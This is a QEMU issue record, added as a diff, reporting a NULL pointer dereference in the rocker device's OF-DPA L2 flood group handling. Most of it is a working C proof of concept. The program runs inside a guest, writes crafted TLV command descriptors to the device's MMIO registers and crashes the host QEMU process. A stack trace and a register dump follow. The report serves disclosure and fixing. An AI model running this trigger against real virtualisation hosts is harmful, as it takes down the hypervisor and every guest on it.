@@ -1,0 +1,443 @@
+id = 1851
+title = "hw/net/rocker: NULL pointer dereference in of_dpa_cmd_add_l2_flood"
+state = "opened"
+created_at = "2023-08-29T08:37:03.357Z"
+closed_at = "n/a"
+labels = ["Networking", "Security"]
+url = "https://gitlab.com/qemu-project/qemu/-/issues/1851"
+host-os = "n/a"
+host-arch = "n/a"
+qemu-version = "n/a"
+guest-os = "n/a"
+guest-arch = "n/a"
+description = """rocker_tlv_parse_nested could return early because of no group ids in the group_tlvs. In such case tlvs is NULL; tlvs\\[i + 1\\] in the next for-loop will deref the NULL pointer."""
+reproduce = """Compile and run the following code within the guest:
+
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <assert.h>
+#include <fcntl.h>
+#include <inttypes.h>
+#include <sys/mman.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <unistd.h>
+#include <sys/io.h>
+#include <stdint.h>
+#include <stdbool.h>
+#include <err.h>
+#include <errno.h>
+#include <pthread.h>
+
+/*
+ * Rocker DMA ring register offsets
+ */
+#define ROCKER_DMA_DESC_BASE            0x1000
+#define ROCKER_DMA_DESC_SIZE            32
+#define ROCKER_DMA_DESC_MASK            0x1F
+#define ROCKER_DMA_DESC_TOTAL_SIZE \\
+    (ROCKER_DMA_DESC_SIZE * 64) /* 62 ports + event + cmd */
+#define ROCKER_DMA_DESC_ADDR_OFFSET     0x00     /* 8-byte */
+#define ROCKER_DMA_DESC_SIZE_OFFSET     0x08
+#define ROCKER_DMA_DESC_HEAD_OFFSET     0x0c
+#define ROCKER_DMA_DESC_TAIL_OFFSET     0x10
+#define ROCKER_DMA_DESC_CTRL_OFFSET     0x14
+#define ROCKER_DMA_DESC_CREDITS_OFFSET  0x18
+#define ROCKER_DMA_DESC_RSVD_OFFSET     0x1c
+
+/*
+ * Rocker dma ctrl register bits
+ */
+#define ROCKER_DMA_DESC_CTRL_RESET      (1 << 0)
+
+/*
+ * Rocker test registers
+ */
+#define ROCKER_TEST_REG                 0x0010
+#define ROCKER_TEST_REG64               0x0018  /* 8-byte */
+#define ROCKER_TEST_IRQ                 0x0020
+#define ROCKER_TEST_DMA_ADDR            0x0028  /* 8-byte */
+#define ROCKER_TEST_DMA_SIZE            0x0030
+#define ROCKER_TEST_DMA_CTRL            0x0034
+
+/*
+ * Rocker general purpose registers
+ */
+#define ROCKER_CONTROL                  0x0300
+#define ROCKER_PORT_PHYS_COUNT          0x0304
+#define ROCKER_PORT_PHYS_LINK_STATUS    0x0310 /* 8-byte */
+#define ROCKER_PORT_PHYS_ENABLE         0x0318 /* 8-byte */
+#define ROCKER_SWITCH_ID                0x0320 /* 8-byte */
+
+/*
+ * Rocker test register ctrl
+ */
+#define ROCKER_TEST_DMA_CTRL_CLEAR      (1 << 0)
+#define ROCKER_TEST_DMA_CTRL_FILL       (1 << 1)
+#define ROCKER_TEST_DMA_CTRL_INVERT     (1 << 2)
+
+#define __le16 uint16_t
+#define __le32 uint32_t
+#define __le64 uint64_t
+
+typedef struct rocker_desc {
+    __le64 buf_addr;
+    uint64_t cookie;
+    __le16 buf_size;
+    __le16 tlv_size;
+    __le16 rsvd[5];   /* pad to 32 bytes */
+    __le16 comp_err;
+} __attribute__((packed, aligned(8))) RockerDesc;
+
+
+/*
+ * Rocker TLV type fields
+ */
+
+typedef struct rocker_tlv {
+    __le32 type;
+    __le16 len;
+    __le16 rsvd;
+} __attribute__((packed, aligned(8))) RockerTlv;
+
+
+typedef struct cmd_group_msg {
+    RockerTlv tlv1;
+    __le64 t1_value;
+    RockerTlv tlv2;
+    __le64 t2_value;
+    RockerTlv tlv3;
+    __le64 t3_value;
+} __attribute__((packed, aligned(8))) CmdGroupMsg;
+
+
+typedef struct cmd_msg {
+    RockerTlv tlv1;
+    __le64 t1_value;
+    RockerTlv tlv2;
+    CmdGroupMsg group_msg;
+} __attribute__((packed, aligned(8))) CmdMsg;
+
+
+typedef struct rx_msg {
+    RockerTlv tlv1;
+    __le64 t1_value;
+    RockerTlv tlv2;
+    __le64 t2_value;
+    RockerTlv tlv3;
+    __le64 t3_value;
+    RockerTlv tlv4;
+    __le64 t4_value;
+    RockerTlv tlv5;
+    __le64 t5_value;
+} __attribute__((packed, aligned(8))) RxMsg;
+
+
+/* Rx msg */
+enum {
+    ROCKER_TLV_RX_UNSPEC,
+    ROCKER_TLV_RX_FLAGS,                /* u16, see RX_FLAGS_ */
+    ROCKER_TLV_RX_CSUM,                 /* u16 */
+    ROCKER_TLV_RX_FRAG_ADDR,            /* u64 */
+    ROCKER_TLV_RX_FRAG_MAX_LEN,         /* u16 */
+    ROCKER_TLV_RX_FRAG_LEN,             /* u16 */
+
+    __ROCKER_TLV_RX_MAX,
+    ROCKER_TLV_RX_MAX = __ROCKER_TLV_RX_MAX - 1,
+};
+
+/* Tx msg */
+enum {
+    ROCKER_TLV_TX_UNSPEC,
+    ROCKER_TLV_TX_OFFLOAD,              /* u8, see TX_OFFLOAD_ */
+    ROCKER_TLV_TX_L3_CSUM_OFF,          /* u16 */
+    ROCKER_TLV_TX_TSO_MSS,              /* u16 */
+    ROCKER_TLV_TX_TSO_HDR_LEN,          /* u16 */
+    ROCKER_TLV_TX_FRAGS,                /* array */
+
+    __ROCKER_TLV_TX_MAX,
+    ROCKER_TLV_TX_MAX = __ROCKER_TLV_TX_MAX - 1,
+};
+
+/* cmd msg */
+enum {
+    ROCKER_TLV_CMD_UNSPEC,
+    ROCKER_TLV_CMD_TYPE,                /* u16 */
+    ROCKER_TLV_CMD_INFO,                /* nest */
+
+    __ROCKER_TLV_CMD_MAX,
+    ROCKER_TLV_CMD_MAX = __ROCKER_TLV_CMD_MAX - 1,
+};
+
+enum {
+    ROCKER_TLV_CMD_TYPE_UNSPEC,
+    ROCKER_TLV_CMD_TYPE_GET_PORT_SETTINGS,
+    ROCKER_TLV_CMD_TYPE_SET_PORT_SETTINGS,
+    ROCKER_TLV_CMD_TYPE_OF_DPA_FLOW_ADD,
+    ROCKER_TLV_CMD_TYPE_OF_DPA_FLOW_MOD,
+    ROCKER_TLV_CMD_TYPE_OF_DPA_FLOW_DEL,
+    ROCKER_TLV_CMD_TYPE_OF_DPA_FLOW_GET_STATS,
+    ROCKER_TLV_CMD_TYPE_OF_DPA_GROUP_ADD,
+    ROCKER_TLV_CMD_TYPE_OF_DPA_GROUP_MOD,
+    ROCKER_TLV_CMD_TYPE_OF_DPA_GROUP_DEL,
+    ROCKER_TLV_CMD_TYPE_OF_DPA_GROUP_GET_STATS,
+
+    __ROCKER_TLV_CMD_TYPE_MAX,
+    ROCKER_TLV_CMD_TYPE_MAX = __ROCKER_TLV_CMD_TYPE_MAX - 1,
+};
+
+/*
+ * cmd info nested for OF-DPA msgs
+ */
+
+enum {
+    ROCKER_TLV_OF_DPA_UNSPEC,
+    ROCKER_TLV_OF_DPA_TABLE_ID,            /* u16 */
+    ROCKER_TLV_OF_DPA_PRIORITY,            /* u32 */
+    ROCKER_TLV_OF_DPA_HARDTIME,            /* u32 */
+    ROCKER_TLV_OF_DPA_IDLETIME,            /* u32 */
+    ROCKER_TLV_OF_DPA_COOKIE,              /* u64 */
+    ROCKER_TLV_OF_DPA_IN_PPORT,            /* u32 */
+    ROCKER_TLV_OF_DPA_IN_PPORT_MASK,       /* u32 */
+    ROCKER_TLV_OF_DPA_OUT_PPORT,           /* u32 */
+    ROCKER_TLV_OF_DPA_GOTO_TABLE_ID,       /* u16 */
+    ROCKER_TLV_OF_DPA_GROUP_ID,            /* u32 */
+    ROCKER_TLV_OF_DPA_GROUP_ID_LOWER,      /* u32 */
+    ROCKER_TLV_OF_DPA_GROUP_COUNT,         /* u16 */
+    ROCKER_TLV_OF_DPA_GROUP_IDS,           /* u32 array */
+    ROCKER_TLV_OF_DPA_VLAN_ID,             /* __be16 */
+    ROCKER_TLV_OF_DPA_VLAN_ID_MASK,        /* __be16 */
+    ROCKER_TLV_OF_DPA_VLAN_PCP,            /* __be16 */
+    ROCKER_TLV_OF_DPA_VLAN_PCP_MASK,       /* __be16 */
+    ROCKER_TLV_OF_DPA_VLAN_PCP_ACTION,     /* u8 */
+    ROCKER_TLV_OF_DPA_NEW_VLAN_ID,         /* __be16 */
+    ROCKER_TLV_OF_DPA_NEW_VLAN_PCP,        /* u8 */
+    ROCKER_TLV_OF_DPA_TUNNEL_ID,           /* u32 */
+    ROCKER_TLV_OF_DPA_TUNNEL_LPORT,        /* u32 */
+    ROCKER_TLV_OF_DPA_ETHERTYPE,           /* __be16 */
+    ROCKER_TLV_OF_DPA_DST_MAC,             /* binary */
+    ROCKER_TLV_OF_DPA_DST_MAC_MASK,        /* binary */
+    ROCKER_TLV_OF_DPA_SRC_MAC,             /* binary */
+    ROCKER_TLV_OF_DPA_SRC_MAC_MASK,        /* binary */
+    ROCKER_TLV_OF_DPA_IP_PROTO,            /* u8 */
+    ROCKER_TLV_OF_DPA_IP_PROTO_MASK,       /* u8 */
+    ROCKER_TLV_OF_DPA_IP_DSCP,             /* u8 */
+    ROCKER_TLV_OF_DPA_IP_DSCP_MASK,        /* u8 */
+    ROCKER_TLV_OF_DPA_IP_DSCP_ACTION,      /* u8 */
+    ROCKER_TLV_OF_DPA_NEW_IP_DSCP,         /* u8 */
+    ROCKER_TLV_OF_DPA_IP_ECN,              /* u8 */
+    ROCKER_TLV_OF_DPA_IP_ECN_MASK,         /* u8 */
+    ROCKER_TLV_OF_DPA_DST_IP,              /* __be32 */
+    ROCKER_TLV_OF_DPA_DST_IP_MASK,         /* __be32 */
+    ROCKER_TLV_OF_DPA_SRC_IP,              /* __be32 */
+    ROCKER_TLV_OF_DPA_SRC_IP_MASK,         /* __be32 */
+    ROCKER_TLV_OF_DPA_DST_IPV6,            /* binary */
+    ROCKER_TLV_OF_DPA_DST_IPV6_MASK,       /* binary */
+    ROCKER_TLV_OF_DPA_SRC_IPV6,            /* binary */
+    ROCKER_TLV_OF_DPA_SRC_IPV6_MASK,       /* binary */
+    ROCKER_TLV_OF_DPA_SRC_ARP_IP,          /* __be32 */
+    ROCKER_TLV_OF_DPA_SRC_ARP_IP_MASK,     /* __be32 */
+    ROCKER_TLV_OF_DPA_L4_DST_PORT,         /* __be16 */
+    ROCKER_TLV_OF_DPA_L4_DST_PORT_MASK,    /* __be16 */
+    ROCKER_TLV_OF_DPA_L4_SRC_PORT,         /* __be16 */
+    ROCKER_TLV_OF_DPA_L4_SRC_PORT_MASK,    /* __be16 */
+    ROCKER_TLV_OF_DPA_ICMP_TYPE,           /* u8 */
+    ROCKER_TLV_OF_DPA_ICMP_TYPE_MASK,      /* u8 */
+    ROCKER_TLV_OF_DPA_ICMP_CODE,           /* u8 */
+    ROCKER_TLV_OF_DPA_ICMP_CODE_MASK,      /* u8 */
+    ROCKER_TLV_OF_DPA_IPV6_LABEL,          /* __be32 */
+    ROCKER_TLV_OF_DPA_IPV6_LABEL_MASK,     /* __be32 */
+    ROCKER_TLV_OF_DPA_QUEUE_ID_ACTION,     /* u8 */
+    ROCKER_TLV_OF_DPA_NEW_QUEUE_ID,        /* u8 */
+    ROCKER_TLV_OF_DPA_CLEAR_ACTIONS,       /* u32 */
+    ROCKER_TLV_OF_DPA_POP_VLAN,            /* u8 */
+    ROCKER_TLV_OF_DPA_TTL_CHECK,           /* u8 */
+    ROCKER_TLV_OF_DPA_COPY_CPU_ACTION,     /* u8 */
+
+    __ROCKER_TLV_OF_DPA_MAX,
+    ROCKER_TLV_OF_DPA_MAX = __ROCKER_TLV_OF_DPA_MAX - 1,
+};
+
+#define PAGE_SHIFT  12
+#define PAGE_SIZE   (1 << PAGE_SHIFT)
+#define PFN_PRESENT (1ull << 63)
+#define PFN_PFN     ((1ull << 55) - 1)
+
+uint64_t get_physical_pfn(void* ptr)
+{
+    uint64_t pfn = -1;
+    FILE* fp = fopen("/proc/self/pagemap", "rb");
+    if (!fp)
+    {
+        return pfn;
+    }
+
+    if (!fseek(fp, (unsigned long)ptr / PAGE_SIZE * 8, SEEK_SET))
+    {
+        fread(&pfn, sizeof(pfn), 1, fp);
+        if (pfn & PFN_PRESENT)
+        {
+            pfn &= PFN_PFN;
+        }
+    }
+    fclose(fp);
+    return pfn;
+}
+
+uint64_t get_physical_addr(void* ptr)
+{
+    uint64_t pfn = get_physical_pfn(ptr);
+    return pfn * PAGE_SIZE + (uint64_t)ptr % PAGE_SIZE;
+}
+
+void* mmio_mem;
+
+void mmio_write(uint32_t addr, uint32_t value)
+{
+    *((uint32_t*)(mmio_mem + addr))= value;
+}
+
+void mmio_write64(uint32_t addr, uint64_t value)
+{
+    *((uint64_t*)(mmio_mem + addr))= value;
+}
+
+uint64_t mmio_read(uint32_t addr)
+{
+    return *((uint64_t*)(mmio_mem +addr));
+}
+
+uint64_t mmio_read64(uint64_t addr)
+{
+    return *((uint64_t*)(mmio_mem +addr));
+}
+
+uint64_t ring_desk_base_addr(int index)
+{
+    return ROCKER_DMA_DESC_BASE + index * 32;
+}
+
+int main()
+{
+    int mmio_fd= open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
+    if (mmio_fd== -1) {
+        printf("mmio_fd open failed");
+    \treturn 1;
+    }
+
+    mmio_mem = mmap(0, 0x2000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
+    if (mmio_mem == MAP_FAILED) {
+        printf("mmap mmio_mem failed");
+\treturn 1;
+    }
+
+    iopl(3);
+
+    RockerTlv cmd_group_tlv = {ROCKER_TLV_OF_DPA_GROUP_ID, sizeof(RockerTlv) + sizeof(__le64), 12345 };
+    RockerTlv cmd_count_tlv = {ROCKER_TLV_OF_DPA_GROUP_COUNT, sizeof(RockerTlv) + sizeof(__le64), 12345};
+    RockerTlv cmd_ids_tlv = {ROCKER_TLV_OF_DPA_GROUP_IDS, sizeof(RockerTlv) + sizeof(__le64), 12345 };
+
+    CmdGroupMsg group_msg = { cmd_group_tlv, 0x40000000, cmd_count_tlv, 65535, cmd_ids_tlv, 12345};
+
+    RockerTlv cmd_type_tlv = {ROCKER_TLV_CMD_TYPE, sizeof(RockerTlv) + sizeof(__le64), 12345 };
+    RockerTlv cmd_info_tlv = {ROCKER_TLV_CMD_INFO, sizeof(RockerTlv) + sizeof(CmdGroupMsg), 12345 };
+    CmdMsg cmd_msg = {cmd_type_tlv, ROCKER_TLV_CMD_TYPE_OF_DPA_GROUP_ADD, cmd_info_tlv, group_msg };
+    RockerDesc cmd_desc = {get_physical_addr(&cmd_msg), 0xdeadbeef, sizeof(CmdMsg), sizeof(CmdMsg), 0x1, 0x4242 };
+
+    mmio_write64(ROCKER_PORT_PHYS_ENABLE, 0xE);
+
+    // cmd ring
+    mmio_write(ring_desk_base_addr(0) + ROCKER_DMA_DESC_CTRL_OFFSET, ROCKER_DMA_DESC_CTRL_RESET);
+    // base_addr
+    mmio_write64(ring_desk_base_addr(0), get_physical_addr(&cmd_desc));
+    mmio_write(ring_desk_base_addr(0) + ROCKER_DMA_DESC_SIZE_OFFSET, 8);
+    mmio_write(ring_desk_base_addr(0) + ROCKER_DMA_DESC_HEAD_OFFSET, 4);
+
+    printf("End\\n");
+    return 0;
+}
+```
+
+Stack trace:
+
+```plaintext
+===================================================================================================
+ldl_he_p(const void * ptr) (/home/arayz/arayz/qemu-git-e1000e/include/qemu/bswap.h:359)
+ldl_le_p(const void * ptr) (/home/arayz/arayz/qemu-git-e1000e/include/qemu/bswap.h:394)
+rocker_tlv_get_le32(const RockerTlv * tlv) (/home/arayz/arayz/qemu-git-e1000e/hw/net/rocker/rocker_tlv.h:114)
+of_dpa_cmd_add_l2_flood(OfDpa * of_dpa, OfDpaGroup * group, RockerTlv ** group_tlvs) (/home/arayz/arayz/qemu-git-e1000e/hw/net/rocker/rocker_of_dpa.c:2043)
+of_dpa_cmd_group_do(OfDpa * of_dpa, uint32_t group_id, OfDpaGroup * group, RockerTlv ** group_tlvs) (/home/arayz/arayz/qemu-git-e1000e/hw/net/rocker/rocker_of_dpa.c:2125)
+of_dpa_cmd_group_add(OfDpa * of_dpa, uint32_t group_id, RockerTlv ** group_tlvs) (/home/arayz/arayz/qemu-git-e1000e/hw/net/rocker/rocker_of_dpa.c:2145)
+of_dpa_group_cmd(OfDpa * of_dpa, struct desc_info * info, char * buf, uint16_t cmd, RockerTlv ** group_tlvs) (/home/arayz/arayz/qemu-git-e1000e/hw/net/rocker/rocker_of_dpa.c:2204)
+of_dpa_cmd(World * world, struct desc_info * info, char * buf, uint16_t cmd, RockerTlv * cmd_info_tlv) (/home/arayz/arayz/qemu-git-e1000e/hw/net/rocker/rocker_of_dpa.c:2234)
+world_do_cmd(World * world, DescInfo * info, char * buf, uint16_t cmd, RockerTlv * cmd_info_tlv) (/home/arayz/arayz/qemu-git-e1000e/hw/net/rocker/rocker_world.c:43)
+cmd_consume(Rocker * r, DescInfo * info) (/home/arayz/arayz/qemu-git-e1000e/hw/net/rocker/rocker.c:450)
+ring_pump(DescRing * ring) (/home/arayz/arayz/qemu-git-e1000e/hw/net/rocker/rocker_desc.c:242)
+desc_ring_set_head(DescRing * ring, uint32_t new) (/home/arayz/arayz/qemu-git-e1000e/hw/net/rocker/rocker_desc.c:281)
+rocker_io_writel(void * opaque, hwaddr addr, uint32_t val) (/home/arayz/arayz/qemu-git-e1000e/hw/net/rocker/rocker.c:805)
+rocker_mmio_write(void * opaque, hwaddr addr, uint64_t val, unsigned int size) (/home/arayz/arayz/qemu-git-e1000e/hw/net/rocker/rocker.c:996)
+memory_region_write_accessor(MemoryRegion * mr, hwaddr addr, uint64_t * value, unsigned int size, int shift, uint64_t mask, MemTxAttrs attrs) (/home/arayz/arayz/qemu-git-e1000e/softmmu/memory.c:492)
+access_with_adjusted_size(hwaddr addr, uint64_t * value, unsigned int size, unsigned int access_size_min, unsigned int access_size_max, MemTxResult (*)(MemoryRegion *, hwaddr, uint64_t *, unsigned int, int, uint64_t, MemTxAttrs) access_fn, MemoryRegion * mr, MemTxAttrs attrs) (/home/arayz/arayz/qemu-git-e1000e/softmmu/memory.c:554)
+memory_region_dispatch_write(MemoryRegion * mr, hwaddr addr, uint64_t data, MemOp op, MemTxAttrs attrs) (/home/arayz/arayz/qemu-git-e1000e/softmmu/memory.c:1514)
+flatview_write_continue(FlatView * fv, hwaddr addr, MemTxAttrs attrs, const void * ptr, hwaddr len, hwaddr addr1, hwaddr l, MemoryRegion * mr) (/home/arayz/arayz/qemu-git-e1000e/softmmu/physmem.c:2783)
+flatview_write(FlatView * fv, hwaddr addr, MemTxAttrs attrs, const void * buf, hwaddr len) (/home/arayz/arayz/qemu-git-e1000e/softmmu/physmem.c:2823)
+address_space_write(AddressSpace * as, hwaddr addr, MemTxAttrs attrs, const void * buf, hwaddr len) (/home/arayz/arayz/qemu-git-e1000e/softmmu/physmem.c:2915)
+address_space_rw(AddressSpace * as, hwaddr addr, MemTxAttrs attrs, void * buf, hwaddr len, _Bool is_write) (/home/arayz/arayz/qemu-git-e1000e/softmmu/physmem.c:2925)
+kvm_cpu_exec(CPUState * cpu) (/home/arayz/arayz/qemu-git-e1000e/accel/kvm/kvm-all.c:2929)
+kvm_vcpu_thread_fn(void * arg) (/home/arayz/arayz/qemu-git-e1000e/accel/kvm/kvm-accel-ops.c:49)
+qemu_thread_start(void * args) (/home/arayz/arayz/qemu-git-e1000e/util/qemu-thread-posix.c:556)
+libpthread.so.0!start_thread(void * arg) (/build/glibc-sMfBJT/glibc-2.31/nptl/pthread_create.c:477)
+libc.so.6!clone() (/build/glibc-sMfBJT/glibc-2.31/sysdeps/unix/sysv/linux/x86_64/clone.S:95)
+===================================================================================================
+
+    disassemble and register context:
+===================================================================================================
+Dump of assembler code for function ldl_he_p:
+   0x000055d8a1a473e6 <+0>:\tpush   %rbp
+   0x000055d8a1a473e7 <+1>:\tmov    %rsp,%rbp
+   0x000055d8a1a473ea <+4>:\tsub    $0x20,%rsp
+   0x000055d8a1a473ee <+8>:\tmov    %rdi,-0x18(%rbp)
+   0x000055d8a1a473f2 <+12>:\tmov    %fs:0x28,%rax
+   0x000055d8a1a473fb <+21>:\tmov    %rax,-0x8(%rbp)
+   0x000055d8a1a473ff <+25>:\txor    %eax,%eax
+   0x000055d8a1a47401 <+27>:\tmov    -0x18(%rbp),%rax
+=> 0x000055d8a1a47405 <+31>:\tmov    (%rax),%eax
+   0x000055d8a1a47407 <+33>:\tmov    %eax,-0xc(%rbp)
+   0x000055d8a1a4740a <+36>:\tmov    -0xc(%rbp),%eax
+   0x000055d8a1a4740d <+39>:\tmov    -0x8(%rbp),%rdx
+   0x000055d8a1a47411 <+43>:\txor    %fs:0x28,%rdx
+   0x000055d8a1a4741a <+52>:\tje     0x55d8a1a47421 <ldl_he_p+59>
+   0x000055d8a1a4741c <+54>:\tcallq  0x55d8a186d6d0 <__stack_chk_fail@plt>
+   0x000055d8a1a47421 <+59>:\tleaveq 
+   0x000055d8a1a47422 <+60>:\tretq   
+End of assembler dump.
+
+rax            0x8                 8
+rbx            0x7f7828088ac0      140154044451520
+rcx            0x0                 0
+rdx            0x7f7828088ac0      140154044451520
+rsi            0x8                 8
+rdi            0x8                 8
+rbp            0x7f7832cfd100      0x7f7832cfd100
+rsp            0x7f7832cfd0e0      0x7f7832cfd0e0
+r8             0x7f7828088ac0      140154044451520
+r9             0x7f7828000790      140154043893648
+r10            0x7f78280008d0      140154043893968
+r11            0x7f7828000080      140154043891840
+r12            0x7ffec007cb1e      140732120156958
+r13            0x7ffec007cb1f      140732120156959
+r14            0x7ffec007cbe0      140732120157152
+r15            0x7f7832cfdb00      140154225285888
+rip            0x55d8a1a47405      0x55d8a1a47405 <ldl_he_p+31>
+eflags         0x10246             [ PF ZF IF RF ]
+cs             0x33                51
+ss             0x2b                43
+ds             0x0                 0
+es             0x0                 0
+fs             0x0                 0
+gs             0x0                 0
+===================================================================================================
+```"""
+additional = """This was wrongly assigned a high-severity CVE and is being discussed on qemu-devel ML: https://lists.nongnu.org/archive/html/qemu-devel/2023-08/msg04621.html"""
